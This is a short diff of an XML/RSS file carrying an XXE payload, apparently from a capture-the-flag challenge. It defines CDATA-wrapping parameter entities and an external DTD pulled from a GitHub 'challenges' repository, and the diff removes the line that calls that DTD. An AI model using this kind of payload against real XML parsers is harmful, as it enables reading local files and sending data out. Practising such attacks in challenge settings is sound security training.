@@ -4,7 +4,6 @@
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/BOTkirial/challenges/refs/heads/main/dtd.dtd">
-%dtd;
 ]]>
 <rss xmlns:xi="http://www.w3.org/2001/XInclude" version="2.0">
   <channel>
